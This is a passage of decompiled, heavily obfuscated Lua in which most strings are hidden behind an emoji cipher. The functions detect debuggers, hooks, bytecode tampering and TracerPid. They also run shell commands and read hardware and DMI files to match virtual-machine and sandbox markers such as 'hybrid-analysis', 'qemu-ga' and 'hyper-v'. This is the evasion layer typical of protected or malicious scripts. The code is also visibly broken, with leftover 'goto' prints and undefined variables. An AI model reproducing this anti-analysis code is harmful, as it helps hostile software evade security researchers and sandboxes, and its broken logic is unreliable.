      end
    else
      print("goto c")
    end
    r16_5 = r2_5[r15_5 + 1]
    r10_5[r16_5] = r14_5
  end
  r0_5 = (r0_5 or ""):gsub("%s+", "")
  local r11_5 = {}
  local r12_5 = #r0_5
  local r13_5 = 1
  local r14_5 = r8_5 * 2
  r15_5 = nil
  if r6_5 then
    r16_5 = r4_5(r3_5(tostring(r1_5) .. "|xor"))
    function r15_5()
      -- line: [55, 55] id: 10
      local r0_10 = r16_5() % 256
      return (r0_10 - r0_10 % 16) / 16, r0_10 % 16
    end
    -- close: r16_5
  end
  while true do
    local xyz = r13_5 + r14_5
    xyz = xyz - 1
    if xyz <= r12_5 then
      local dsa = r0_5:sub(r13_5, r13_5 + r8_5 - 1)
      local r17_5 = r0_5:sub(r13_5 + r8_5, r13_5 + r14_5 - 1)
      local r18_5 = r10_5[dsa]
      local r19_5 = r10_5[r17_5]
      if r18_5 then
        if not r19_5 then
          break
        else
          if r15_5 then
            local r20_5, r21_5 = r15_5()
            r18_5 = r5_5(r18_5, r20_5)
            r19_5 = r5_5(r19_5, r21_5)
          end
          r11_5[#r11_5 + 1] = string.char(r18_5 * 16 + r19_5)
          r13_5 = r13_5 + r14_5
        end
      else
        break
      end
    else
      break
    end
  end
  r16_5 = table
  r16_5 = r16_5.concat
  return r16_5(r11_5)
end
local r11_0 = {}
local r12_0 = package.config:sub(1, 1) == r10_0("🌊🐬", r0_0)
local function r13_0(r0_11)
  -- line: [67, 67] id: 11
  return (r0_11 or r10_0("", r0_0)):lower()
end
local function r14_0(r0_12)
  -- line: [68, 73] id: 12
  local r1_12 = {}
  if not r0_12 then
    return r1_12
  end
  for r5_12 in r0_12:gmatch("([^\r\n]+)") do
    r1_12[#r1_12 + 1] = r5_12
  end
  return r1_12
end
local function r15_0(r0_13)
  -- line: [74, 80] id: 13
  local r1_13, r2_13 = pcall(io.popen, r0_13)
  if not r1_13 or not r2_13 then
    return r10_0("", r0_0)
  end
  local r3_13 = r2_13:read(r10_0("🐠🐡🐡🐬", r0_0))
  r2_13:close()
  return r3_13 or r10_0("", r0_0)
end
local function r16_0(r0_14)
  -- line: [81, 85] id: 14
  local r1_14 = io.open(r0_14, r10_0("🌺🌴🐡🌊", r0_0))
  if r1_14 then
    r1_14:close()
    return true
  end
  return false
end
local function r17_0(r0_15)
  -- line: [86, 91] id: 15
  for r4_15, r5_15 in ipairs(r0_15) do
    if r16_0(r5_15) then
      return r5_15
    end
  end
  return nil
end
local function r18_0(r0_16)
  -- line: [92, 92] id: 16
  return os.getenv(r0_16)
end
local function r19_0()
  -- line: [93, 93] id: 17
  return (os.clock() or 0) * 1000
end
local function r20_0(r0_18, r1_18)
  -- line: [94, 94] id: 18
  r0_18[#r0_18 + 1] = r1_18
end
r11_0.fa = {
  fb = 25,
  fc = 200000,
  fd = 2,
  fe = 1,
  ff = 2,
}
function r11_0.fp()
  -- line: [102, 117] id: 19
  if type(debug) ~= r10_0("🌺🌋🐡🐬🐢🌋🐡🐢🐳🐳", r0_0) then
    return false, r10_0("🐬🥥🐡🌴🦀🌈🐡🌊🐳🐳🐚🦈🐡🐢🦀🐙🦀🐠🐠🐳🌴🐢🐬🐚", r0_0)
  end
  local r0_19 = {
    fg = true,
    fh = true,
    fi = true,
    fj = true,
    fk = true,
    fl = true,
    fm = true,
    fn = true,
    fo = true,
  }
  local r1_19 = debug
  local r3_19 = pcall(setmetatable, r1_19, {
    __index = function(r0_20, r1_20)
      -- line: [110, 113] id: 20
      if r0_19[r1_20] then
        error(r10_0("🐬🌋🐡🐠🐢🌋🦈🥥🐳🦈🐋🐳🐳🦀🐙🐢🐋🐚🐬🐋🌴🐬🐬🌊🐳🦈🐢🌴🥥🐚🐬🐡🌊🌋🐬🐢🐡🌈", r0_0) .. r1_20, 2)
      end
      return rawget(r1_19, r1_20)
    end,
    __newindex = function()
      -- line: [114, 114] id: 21
      error(r10_0("🐬🌋🐡🐠🐢🌋🦈🥥🐳🦈🐋🐳🐳🦀🐙🐢🐋🐚🐬🐋🌴🐢🌺🐙🌺🌋🌈🦀🥥🌊🐬🥥🌊🌋🌺🐙🥥🐳🐚🐋🐠🐙🌺🐙", r0_0), 2)
    end,
  }) ~= false
  local r4_19 = nil	-- notice: implicit variable refs by block#[8]
  if r2_19 then
    r4_19 = r10_0("🐬🐬🐡🌴🐢🐋🐡🐙🐳🐳🐚🌺", r0_0)
    if not r4_19 then
      -- ::label_53::
      r4_19 = r10_0("🐬🌺🐡🐠🌈🌴🐡🐡🐠🐠🐚🐠🦈🐙🦀🦈🐢🌺🐬🐋🦀🌺🐬🌈🐠🐙🦀🐚🥥🐬🐬🥥🌊🐳🐳🐚🥥🦀🐚🌊", r0_0)
    end
  else
    print("goto d")
  end
  return r3_19, r4_19
end
local function r22_0()
  -- line: [119, 119] id: 22
end
function r11_0.fq()
  -- line: [120, 124] id: 23
  if type(debug) ~= r10_0("🌺🌋🐡🐬🐢🌋🐡🐢🐳🐳", r0_0) or not debug.sethook then
    return false
  end
  debug.sethook(r22_0, r10_0("🐬🐬", r0_0), 0)
  return true
end
function r11_0.fr()
  -- line: [126, 130] id: 24
  if type(debug) ~= r10_0("🌺🌋🐡🐬🐢🌋🐡🐢🐳🐳", r0_0) or not debug.gethook then
    return false, nil, nil
  end
  local r0_24, r1_24, r2_24 = debug.gethook()
  return r0_24 ~= nil, r1_24, r2_24
end
function r11_0.fs()
  -- line: [132, 136] id: 25
  if type(debug) ~= r10_0("🌺🌋🐡🐬🐢🌋🐡🐢🐳🐳", r0_0) or not debug.gethook then
    return false
  end
  return debug.gethook() == r22_0
end
function r11_0.ft(r0_26, r1_26)
  -- line: [138, 146] id: 26
  local r2_26 = r0_26 or r11_0.fa.fb
  local r3_26 = r1_26 or r11_0.fa.fc
  local r4_26 = r19_0()
  local r5_26 = 0
  for r9_26 = 1, r3_26, 1 do
    r5_26 = r5_26 + r9_26
  end
  return r2_26 < r19_0() - r4_26, r6_26
end
local function r27_0(r0_27)
  -- line: [148, 153] id: 27
  local r1_27, r2_27 = pcall(string.dump, r0_27, true)
  if r1_27 then
    return r2_27
  end
  r1_27, r2_27 = pcall(string.dump, r0_27)
  local r3_27 = nil	-- notice: implicit variable refs by block#[5]
  if r1_27 then
    r3_27 = r2_27
    if r3_27 then
      -- ::label_20::
      r3_27 = nil
    end
  else
    print("goto e")
  end
  return r3_27
end
r11_0.fu = r27_0
function r11_0.fv(r0_28, r1_28)
  -- line: [154, 157] id: 28
  local r2_28 = r27_0(r0_28)
  local r3_28 = nil	-- notice: implicit variable refs by block#[4]
  if r2_28 ~= nil then
    r3_28 = r2_28 == r1_28
  else
    print("goto f")
  end
  return r3_28
end
local r29_0 = {
  r10_0("🐬🌺🐡🌴🐢🌋🐡🌊🐳🐳🐚🦈🐡🐢🦀🐙", r0_0),
  r10_0("🐬🐬🐡🐚🐢🌴🐡🥥🐳🥥🐙🐬🦈🐋🦀🐙🐢🌺🐳🐢", r0_0),
  r10_0("🐬🌋🐡🐠🐢🌋🦈🥥🐳🦈🐚🥥🦈🐢🌴🐋", r0_0),
  r10_0("🌺🌈🦈🥥🐢🐋🐡🌋🐳🐠🐚🐬🌊🌊🦀🦀🐢🌺🐠🐢🦀🦈🐬🌋🐳🦀🐢🌋🥥🌊", r0_0),
  r10_0("🌺🌈🦈🥥🐢🐋🐡🌋🐳🐠🐚🐬🌊🐬🦀🦈🌈🌺🐠🌋🌴🌴🌺🐙", r0_0)
}
print(r29_0)
function r11_0.fw()
  -- line: [161, 168] id: 29
  for r3_29, r4_29 in ipairs(r29_0) do
    if package.loaded[r4_29] then
      return r4_29
    end
    if pcall(require, r4_29) then
      return r4_29
    end
  end
  return nil
end
function r11_0.fx()
  -- line: [170, 176] id: 30
  -- notice: unreachable block#7
  local r0_30 = io.open(r10_0("🐠🌊🦈🌺🌈🌋🐡🌋🐳🌊🐋🌈🐡🐚🦀🌴🐢🌋🐠🦀🌈🐚🌺🐙🐠🐙🐢🐙🌊🥥🌺🐡🥥🦀", r0_0), r10_0("🌺🌴", r0_0))
  if not r0_30 then
    return false
  end
  local r1_30 = r0_30:read(r10_0("🐠🐡🐡🐬", r0_0))
  r0_30:close()
  local r2_30 = r1_30 and r1_30:match("TracerPid:%s*(%d+)")
  local r3_30 = nil	-- notice: implicit variable refs by block#[9]
  if r2_30 then
    r3_30 = 0 < tonumber(r2_30)
  else
    print("goto g")
  end
  return r3_30
end
local r32_0 = {
  r10_0("🐬🐢🐡🐳🐢🌋", r0_0),
  r10_0("🐬🐬🐡🐚🐢🌴🐡🐳", r0_0),
  r10_0("🐬🐳🐡🐳🐢🐢", r0_0),
  r10_0("🐬🐳🐡🐳🐢🐢🌊🌺🐬🐠", r0_0),
  r10_0("🐬🐳🐡🐳🐢🐢🐡🐬", r0_0),
  r10_0("🐬🐳🐡🐳🐢🐢🐡🐬🐬🐡🌋🌺", r0_0),
  r10_0("🌺🐠🌊🦈🌴🌴🐡🌊🐳🥥🐚🥥", r0_0),
  r10_0("🌺🐠🌊🥥🌴🌋🐡🌊🐳🥥🐚🥥", r0_0),
  r10_0("🐬🌊🐡🐚🐢🐡🦈🌴🐳🐠🐚🦈🦈🐋", r0_0),
  r10_0("🐬🌋🐡🦀🌈🐋🦈🦈🐠🐋", r0_0),
  r10_0("🐬🐢🐡🐋🐢🌊🐡🌊🐠🥥🐚🐠", r0_0),
  r10_0("🌺🌴🐡🐬🐢🌴🐡🐡🐠🥥🐚🐬", r0_0),
  r10_0("🌺🌴🌊🌊", r0_0),
  r10_0("🐬🐠🐡🌴🌈🌈🦈🦈🐳🐳🐙🦈", r0_0),
  r10_0("🌺🐢🐡🌋🐢🐠🐡🌊🐳🥥🐚🥥", r0_0),
  r10_0("🐬🐳🐡🐙🐢🦈🦈🥥🐳🌴🐚🐙🐡🌈🌴🥥🐢🐬🐠🐙🌴🐬🌺🌈🐳🦀🐢🌈🥥🌊🌺🌺", r0_0),
  r10_0("🐬🦀🐡🐋🐢🦀🐡🐡🐠🐠🐚🐬🦈🐬🦀🐙🐢🐚🐠🦈🌴🦈", r0_0),
  r10_0("🐬🌈🦈🌊🐢🌊🐡🌊🐳🌺", r0_0),
  r10_0("🐬🌈🦈🌊🐢🌊🐡🌊🐳🌺🐋🌋🐡🐚🦀🌴🌈🐡🐳🦀🌴🦈🌺🐚", r0_0),
  r10_0("🌺🦀🦈🐳🌈🌋🐡🐡🐳🌊🐚🐬", r0_0),
  r10_0("🐬🐬🦈🐳🌈🌋🐡🐡🐳🌊🐚🐬", r0_0),
  r10_0("🌺🦀🦈🌋🌈🐋🐡🌊🐳🐋🐚🥥", r0_0),
  r10_0("🌺🐙🦈🌊🐢🐳🐡🐠🐳🐚🐚🌈🦈🐬", r0_0),
  r10_0("🌺🐙🦈🌊🐢🐳🐡🐠🐳🐳🐙🐚🐡🌴", r0_0),
  r10_0("🌺🐢🐡🌋🌈🌋🐡🥥🐠🌊🐚🐚🦈🦀🌴🐋🐢🦀", r0_0),
  r10_0("🐬🌈🐡🌋🐢🌴🐡🌊🐳🐙🐚🐬🐡🐙", r0_0),
  r10_0("🌺🌋🐡🥥🌈🌈🐡🌊🐠🐳🐚🌋🐡🌴", r0_0),
  r10_0("🐬🌈🐡🌋🐢🐡🐡🥥🐳🐚🐚🌈🦈🐬", r0_0),
  r10_0("🌺🌴🐡🐠🐢🐚🐡🌈🐳🦀🐚🐢", r0_0),
  r10_0("🐬🐚🦈🌺🐢🌊🐡🌈🐳🦀🐚🐢🦈🦈🌴🦀🐢🐢🐳🐢", r0_0),
  r10_0("🐬🐡🐡🌴🐢🦀🦈🐠🐳🌺🐚🐢🦈🌈🦀🐋🐢🐢🐳🌺", r0_0),
  r10_0("🐬🐡🐡🌴🐢🦀🐡🐳🐳🦀🐙🐚", r0_0),
  r10_0("🐬🦀🦈🐠🐢🐋🐡🐙🐳🦀🐚🌈", r0_0),
  r10_0("🐬🦀🐡🐬🌈🌈🐡🥥", r0_0),
  r10_0("🐬🐚🐡🦀🌈🌊🦈🐳🐠🐳🐚🐢", r0_0),
  r10_0("🐬🐚🐡🦀🌈🌊🥥🐋🐠🥥🐙🐬🦈🐬", r0_0),
  r10_0("🌺🌋🐡🐋🌈🌋🐡🥥🐳🌺🐙🌺🦈🐋🌴🐋🐢🐚🐠🐚", r0_0),
  r10_0("🐬🌈🐡🐬🐢🐡🐡🐠🐳🦀🐚🐢🐡🐚🦀🌈🐢🌈🐠🐚🌴🐬🐬🐬🐠🐬", r0_0),
  "hybrid%-analysis",
  r10_0("🌺🌋🦈🌊🐢🌊🐡🐡🐳🦈🐚🐬", r0_0),
  r10_0("🌺🌈🐡🌊🐢🐳🦈🦀🐠🌊🐚🐬🐡🐙🌴🐚🐢🐚🐠🌈🌴🦈", r0_0),
  r10_0("🌺🌈🐡🌊🐢🐳🦈🦀🐠🐠🐙🦈🦈🦀🌴🥥", r0_0),
  r10_0("🌺🌈🐡🐙🌈🌴🐡🌋🐳🦀🐚🐋🐡🐚🦀🦀", r0_0),
  r10_0("🌺🌈🐡🐙🌈🐋🦈🐳🐠🐡🐚🐡", r0_0),
  r10_0("🌺🌈🐡🐡🐢🐢🦈🥥🐠🐠🐚🐚🐡🐚🦀🌴🌈🐡🐳🦀🌴🐢🐬🐙🐳🐚", r0_0),
  r10_0("🌺🌈🐡🐙🌈🐚🐡🐡🐠🥥🐚🐬🐡🌈🌴🐋🐢🐳🐳🐬", r0_0),
  "qemu%-ga"
}
function r11_0.fy()
  -- line: [190, 205] id: 31
  local r0_31 = r10_0("", r0_0)
  if r12_0 then
    r0_31 = r15_0(r10_0("🌺🌋🐡🐬🌈🐋🐡🐙🐳🐙🐚🐙🐡🐚🌴🦀🦀🐠🐬🐡🦀🐠🐠🦀🐬🌈🌴🌊🐡🐡🥥🐚🐬🐋🦈🐚", r0_0))
    if #r0_31 == 0 then
      r0_31 = r15_0(r10_0("🌺🐢🐡🐙🐢🌊🐡🐠🌺🐬🐙🐳🐡🐙🦀🐠🐢🦈🐠🐙🦀🌺🌺🐙🌺🌋🐢🌈🥥🌊🌺🦈🦈🐙🦈🥥🥥🐢🐙🦈🐳🐠🐬🐙🌴🌺🌈🐳🌴🌋🐋🌈🌺🐚🦀🥥🐠🐳🌴🐙🐳🌋🦀🦈🐬🐬🌋🌋🐳🐠🌋🥥🌊🐬🥥🦈🐠🐬🐳🐢🦈🌈🐚🐙🌈🌴", r0_0))
    end
  else
    r0_31 = r15_0(r10_0("🌺🐙🦈🥥🦀🌈🐡🐡🐠🌋🐋🐳🌊🌊🦀🐠🦀🐠🐠🌈🌴🐚🐬🥥🐳🐳🌴🐬🐡🐡🐠🌴🌊🌊🌺🌺🥥🐢🐙🐳🐠🦈🌺🐡🐢🌊🌴🐢🦀🐡🌴🦈🐳🐚🦀🐢🐠🐚🦀🐢🌺🐋🦀🐚🌊🐋🌋🐚🐳🐡", r0_0))
  end
  r0_31 = r13_0(r0_31)
  for r4_31, r5_31 in ipairs(r32_0) do
    if r0_31:find(r5_31, 1, true) then
      return r5_31
    end
  end
  return nil
end
local r34_0 = {
  r10_0("🥥🐬🐠🐳🌋🐳🐳🦈🐡🥥🦀🐬🐳🥥🐚🐠🐋🐳🐡🐚", r0_0),
  r10_0("🥥🐬🐠🐳🌋🐳🐠🐡🐡🐳🦀🌺🐳🦈🐙🦀", r0_0),
  r10_0("🥥🐬🐠🐳🌋🐳🐠🐢🦈🐋🦀🦈🐠🐙🐚🌈🌋🐡🦈🐬🐚🐚🌊🦀🦈🐋🌋🐋🐬🌴", r0_0),
  r10_0("🥥🌋🐳🌋🐋🐡🐠🌊🐡🦀🦀🐙🐳🐬🐙🌋🐋🌺🦈🐢🐚🐡🌊🐬🦈🐠🐋🐠🐬🐠🌊🌺🌺🐚🐡🌊🐬🌊🦀🥥🦈🌊", r0_0),
  r10_0("🥥🌋🐳🌋🐋🐡🐠🌊🐡🦀🦀🌊🐳🌺🐙🐋🐋🦈🐡🐙🐚🐚🥥🐋🦈🐠🐋🐙🌺🥥🌊🐙🌺🥥🦈🐬🐬🦈🦀🥥🦈🌊🌊🐳🐙🦀🌋🌋🌋🌺", r0_0),
  r10_0("🥥🌈🐳🌊🐋🌊🐠🌊🦈🌺", r0_0),
  r10_0("🥥🌈🐳🌊🐋🌊🐠🌊🦈🌺🌴🌈🐠🐚🐚🌋🌋🐡🐡🐬🐚🥥🌊🐢", r0_0),
  r10_0("🌊🐙🐠🌋🐋🐠🐳🌋🐡🐠🦀🌈🐳🌺🐚🦈", r0_0),
  r10_0("🥥🐬🐳🐠🐋🐢🐳🌋🦈🐠🦀🐬🐳🐙🐙🌴🐋🌊", r0_0)
}
function r11_0.fz()
  -- line: [212, 218] id: 32
  for r3_32, r4_32 in ipairs(r34_0) do
    local r5_32 = r18_0(r4_32)
    if r5_32 and 0 < #r5_32 then
      return r4_32, r5_32
    end
  end
  return nil
end
local r36_0 = {
  r10_0("🌺🌈🐡🐙🌈🐚🐡🐡🐠🥥🐚🐬", r0_0),
  r10_0("🌺🌈🐡🌋🌈🌋🦈🌊🐠🐳🐚🐠🦈🥥🦀🐋🐢🐢🐳🌺", r0_0),
  r10_0("🌺🌈🐡🌊🐢🐳🦈🦀", r0_0),
  r10_0("🐬🌺🐡🌋🐢🐋🦈🐳🐳🦀🐙🐡🦈🌺🦀🐚🌈🐬🐬🐋🌴🌺🐬🐬🐠🌈🌈🐚🥥🐋🌺🌺🌊🐚🐠🐳🥥🌊🐚🌋🐠🌴", r0_0),
  "hyper%-v",
  r10_0("🌺🐚🐡🐠🐢🦈🦈🥥", r0_0),
  r10_0("🐬🦈🦈🦈🐢🦈", r0_0),
  r10_0("🌺🐙🐡🐬🌈🌋🐡🐡🐳🐙🐚🐋🦈🐢🦀🦈🌈🦈", r0_0),
  r10_0("🌺🐠🐡🐠🐢🐠", r0_0),
  r10_0("🐬🐳🐡🦀🐢🐠🐡🌋🐠🐠🐚🐬🦈🐳", r0_0),
  r10_0("🐬🌴🐡🌴🐢🐋🐡🦀🐠🌊", r0_0)
}
function r11_0.f0()
  -- line: [225, 251] id: 33
  local r0_33 = {}
  if r12_0 then
    local r1_33 = r13_0(r15_0(r10_0("🌺🐢🐡🐙🐢🌊🐡🐠🌺🐬🐚🐡🦈🌺🦀🐡🌈🐠🐳🐙🦀🐡🐬🌈🐠🌈🌈🌴🌊🦀🌺🐬🥥🌋🐳🐠🥥🦈🐋🦈🐠🦈🐬🐬🦀🌈🌴🐢🌈🐋🐢🌋🌺🐙🌴🌈🐠🌴🌴🐙🐳🐳🌴🦈🌊🐋🐋🌊🐳🦀🐋🐳🌊🐙🦈🌋🌺🌺🌺🦀🐳🌺🌴🐳🐙🥥🦀🐚🥥🐡🐋🐚🌴🌋🐋🐡🦀🐬", r0_0)))
    local r2_33 = r13_0(r15_0(r10_0("🌺🦀🦈🌋🌈🐋🦈🌊🐳🐳🐚🌋🦈🦈🦀🐳🐢🥥🐠🐡🌈🥥🐳🐚🐬🐡🦀🐚🐬🌋🌊🐡🌺🐬", r0_0)))
    if #r1_33 > 0 then
      r20_0(r0_33, r1_33)
    end
    if #r2_33 > 0 then
      r20_0(r0_33, r2_33)
    end
  else
    for r4_33, r5_33 in ipairs({
      r10_0("🐠🌊🦈🥥🌈🌊🦈🐠🌺🦀🐚🐡🦈🥥🦀🌈🌈🦈🐳🌈🌈🐚🐬🐢🐳🐳🐢🐠🐡🐋🐬🌈🌊🌋🌺🌴🌊🌈🐙🐳🐠🦀🐬🌺🦀🐢🌈🌋🐢🐬🌋🐡🌺🐙🦀🌴🐠🐳🌴🌋", r0_0),
      r10_0("🐠🌊🦈🥥🌈🌊🦈🐠🌺🦀🐚🐡🦈🥥🦀🌈🌈🦈🐳🌈🌈🐚🐬🐢🐳🐳🐢🐠🐡🐋🐬🌈🌊🌋🌺🌴🌊🐋🐙🌴🐳🌊🌊🌈🦀🌋🌈🌴🌈🌈🐢🐚🌺🐚🌴🐚", r0_0),
      r10_0("🐠🌊🦈🥥🌈🌊🦈🐠🌺🦀🐚🐡🦈🥥🦀🌈🌈🦈🐳🌈🌈🐚🐬🐢🐳🐳🐢🐠🐡🐋🐬🌈🌊🌋🌺🌴🥥🌋🐚🌋🐠🌺🌺🦈🌴🌈🐋🐠🐢🥥🐢🐙🌺🐙🦀🐢🐠🦈🦀🦀", r0_0),
      r10_0("🐠🌊🦈🥥🌈🌊🦈🐠🌺🦀🐚🐡🦈🥥🦀🌈🌈🦈🐳🌈🌈🐚🐬🐢🐳🐳🐢🐠🐡🐋🐬🌈🌊🌋🌺🌴🥥🌋🐚🌴🐠🦀🌺🐡🐚🌺🐢🐚🌈🌺🐢🦈🌺🐡🦀🐬🐳🌈", r0_0)
    }) do
      local r6_33 = io.open(r5_33, r10_0("🌺🌴", r0_0))
      if r6_33 then
        local r7_33 = r6_33:read(r10_0("🐠🐡🐡🐚", r0_0)) or r10_0("", r0_0)
        r6_33:close()
        if #r7_33 > 0 then
          r20_0(r0_33, r13_0(r7_33))
        end
      end
    end
    local r1_33 = io.open(r10_0("🐠🌊🦈🌺🌈🌋🐡🌋🐳🌊🐋🌈🦈🐚🌴🐢🌈🌺🐠🐬🌴🐙🐬🐋🐳🦈", r0_0), r10_0("🌺🌴", r0_0))
    local r2_33 = r13_0
    if r1_33 then
      local r3_33 = r1_33:read(r10_0("🐠🐡🐡🐬", r0_0)) or r10_0("", r0_0)
    else
      print("goto h")
    end
    r2_33 = r2_33(r3_33)
    if r1_33 then
      r1_33:close()
    end
    if #r2_33 > 0 then
      r20_0(r0_33, r2_33)
    end
  end
  local r1_33 = table.concat(r0_33, r10_0("🐡🐡", r0_0))
  for r5_33, r6_33 in ipairs(r36_0) do
    if r1_33:find(r6_33) then
      return r6_33
    end
  end
  return nil
end
function r11_0.f1()
  -- line: [253, 275] id: 34
  if r12_0 then
    return r17_0({
      r10_0("🥥🦀🌊🐢🌋🐡🐳🐬🐳🐋🐚🐢🦈🌈🦀🐠🌈🌊🐳🌈🐚🌴🌊🐙🐠🌺🌈🌴🌊🥥🐬🐡🌊🌺🐬🥥🦈🌋🌴🐢🐠🐠🌺🦈🌴🦈🐢🐚🌈🌺🌈🐢🐬🌺🐙🌊🦈🌴🐙🦀🐳🐋🌴🐢🐬🌺🌋🌴🐠🦀🐋🐠🦈🐳🌊🐢🐬🐚🐬🥥🐠🦈", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🐬🐳🐋🐚🐢🦈🌈🦀🐠🌈🌊🐳🌈🐚🌴🌊🐙🐠🌺🌈🌴🌊🥥🐬🐡🌊🌺🐬🥥🦈🌋🌴🐢🐠🐠🌺🦈🌴🦈🐢🐚🌈🌺🌈🐢🐬🌺🐙🌊🦈🌴🐙🦀🐳🐋🌴🐢🐬🐢🐋🐠🐳🦀🐋🐠🐡🐠🌊🐢🐬🐚🐬🥥🐠🦈", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🐬🐳🐋🐚🐢🦈🌈🦀🐠🌈🌊🐳🌈🐚🌴🌊🐙🐠🌺🌈🌴🌊🥥🐬🐡🌊🌺🐬🥥🦈🌋🌴🐢🐠🐠🌺🦈🌴🦈🐢🐚🌈🌺🌈🐢🐬🌺🐙🌊🦈🌴🐙🦀🐳🐋🌴🐢🌺🦀🌈🦈🌺🐠🐋🐠🐡🐋🐡🐡", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🐬🐳🐋🐚🐢🦈🌈🦀🐠🌈🌊🐳🌈🐚🌴🌊🐙🐠🌺🌈🌴🌊🥥🐬🐡🌊🌺🐬🥥🦈🌋🌴🐢🐠🐠🌺🦈🌴🦈🐢🐚🌈🌺🌈🐢🐬🌺🐙🌊🦈🌴🐙🦀🐳🐋🌴🐢🌺🌈🌋🌋🐳🌴🌋🥥🦈🦀🌊🐢🐬🐚🐬🥥🐠🦈", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🐬🐳🐋🐚🐢🦈🌈🦀🐠🌈🌊🐳🌈🐚🌴🌊🐙🐠🌺🌈🌴🌊🥥🐬🐡🌊🌺🐬🥥🦈🌋🌴🐢🐠🐠🌺🦈🌴🦈🐢🐚🌈🌺🌈🐢🐬🌺🐙🌊🐳🌴🌴🐬🐳🐢🦀🐙🌊🐋🐋🥥🐳🦀🐙🐋🐡🌊🐡🐙🐬🐚", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🐬🐳🐋🐚🐢🦈🌈🦀🐠🌈🌊🐳🌈🐚🌴🌊🐙🐠🌺🌈🌴🌊🥥🐬🐡🌊🌺🐬🥥🦈🌋🌴🐢🐠🐠🌺🦈🌴🦈🐢🐚🌈🌺🌈🐢🐬🌺🐙🌊🐳🌴🌴🐬🐳🌴🦀🐠🥥🌈🐋🥥🌺🐠🐋🐠🐡🐋🐡🐡", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🐬🐳🐋🐚🐢🦈🌈🦀🐠🌈🌊🐳🌈🐚🌴🌊🐙🐠🌺🌈🌴🌊🥥🐬🐡🌊🌺🐬🥥🦈🌋🌴🐢🐠🐠🌺🦈🌴🦈🐢🐚🌈🌺🌈🐢🐬🌺🐙🌊🐳🌴🌴🐬🐬🐳🦀🦈🥥🌺🐋🌺🌺🐠🐋🐠🐡🐋🐡🐡", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🦈🐠🥥🐚🌈🦈🐋🌴🐋🐢🐳🐠🐠🌈🥥🥥🐋🐳🌺🐢🌺🥥🌊🌺🐬🐬🐬🐡🦈🐬🦈🐙🐬🐠🌺🌺🦈🌴🐢🐋🦈🐋🥥🐋🐠🐬🐳🦀🌴🐳🌈🌴🌋🌺🐡🐙🦈🥥🌊🌋🌴🐳🐡🐋🐠🐠🐙🐡🌊🌺🌊🐬🦀🐳🐢🌴🐡🌋🌴🐢🐙🦈🐙🐋🌊🐙🌊🐢🐢🐚🐋", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🐬🐳🐋🐚🐢🦈🌈🦀🐠🌈🌊🐳🌈🐚🌴🌊🐙🐠🌺🌈🌴🌊🥥🐬🐡🌊🌺🐬🥥🦈🌋🌴🐢🐳🌺🐬🐬🌴🌊🐢🌴🌴🐋🐢🌴🌺🌊🐢🌺🐠🐚🦀🐳🐳🌊", r0_0)
    })
  else
    local r0_34 = r13_0(r15_0(r10_0("🐬🐬🦈🥥🐢🦈🐡🌋🐳🐠🐋🐳🥥🐙🌈🐳🦀🐢🐠🐚🌴🦈🌺🐋🌺🦈🐢🌊🌊🌊🐬🦀🌊🐬", r0_0)))
    for r4_34, r5_34 in ipairs({
      r10_0("🌺🌈🐡🌊🐢🐳🦈🦀🐳🦈🐙🐬🦈🐢🌴🌋🌈🐬", r0_0),
      r10_0("🌺🌈🐡🌊🐢🐳🦈🦀🐠🌊🐚🌊", r0_0),
      r10_0("🌺🌈🐡🌊🐢🐳🦈🦀🐠🐡🐚🐙🦈🌈🦀🌴🐢🐢", r0_0),
      r10_0("🌺🌈🐡🐙🌈🐚🐡🐬🐳🐡🐙🐚", r0_0),
      r10_0("🐬🐠🦈🦈🌋🐳🦈🌺🐳🐚🐚🦈🐡🐢🌴🌋", r0_0),
      r10_0("🐬🐠🦈🦈🌋🐳🦈🥥🐠🐠🐚🐙🦈🥥🌴🌋", r0_0),
      r10_0("🐬🦈🦈🦈🐢🦈", r0_0),
      r10_0("🌺🐚🦈🐋🐢🐡", r0_0),
      r10_0("🐬🌴🐡🌴🐢🐋🐡🦀🐠🌊🐚🌺🐡🐙🦀🐡", r0_0)
    }) do
      local r6_34 = #r0_34
      if r6_34 > 0 then
        r6_34 = r0_34:find(r5_34, 1, true)
        if r6_34 then
          return r5_34
        end
      end
    end
    return r17_0({
      r10_0("🐠🌊🦈🐠🌈🐋🦈🐳🌺🦀🐙🐡🦈🐙🦀🥥🐢🌈🐬🐡🦀🌊🐬🌈🐳🐳🌈🌋🐡🐢🐬🐠🌊🐚", r0_0),
      r10_0("🐠🌊🦈🥥🐢🌋🐡🌴🐳🌴🐋🌈🐡🦀🦀🌴🐢🐋🐳🐙🌈🦀🐬🌋🐳🐋", r0_0),
      r10_0("🐠🌊🦈🐠🌈🐋🦈🐳🌺🦀🐚🦈🦈🦈🦀🐳🦀🐢🐳🌋🌴🦈🐬🥥🐠🐚🦀🐬🥥🌺🐬🥥", r0_0)
    })
  end
end
function r11_0.f2()
  -- line: [277, 286] id: 35
  local r0_35 = r13_0
  local r1_35 = r18_0
  local r2_35 = r12_0
  if r2_35 then
    r2_35 = r10_0("🌊🐋🐳🥥🐋🦀🐳🐳🦈🌴🦀🐠🐳🌊🐚🌴", r0_0) or r10_0("🌊🐋🐳🥥🐋🦀🐳🐳", r0_0)
  else
    print("goto i")
  end
  r0_35 = r0_35(r1_35(r2_35) or r10_0("", r0_0))
  r1_35 = r13_0
  r2_35 = r18_0
  local r3_35 = r12_0
  if r3_35 then
    r3_35 = r10_0("🥥🦀🐠🌴🐋🦈🐳🦈🐡🐳🌴🌺🐳🐢🐙🐋🐋🌈🐡🌋🐙🦀🥥🌈", r0_0) or r10_0("🥥🐠🐠🌴🌋🐋🐳🌊🦈🌴🦀🐠🐳🌊🐚🌴", r0_0)
  else
    print("goto j")
  end
  r1_35 = r1_35(r2_35(r3_35) or r10_0("", r0_0))
  for r6_35, r7_35 in ipairs({
    r10_0("🌺🦀🐡🐬🐢🐠🐡🌊🐳🥥🐚🌈🐡🐡", r0_0),
    r10_0("🐬🐚🐡🦀🐢🐢🐡🐢🐠🐋🐙🐡🦈🦈🌴🌋", r0_0),
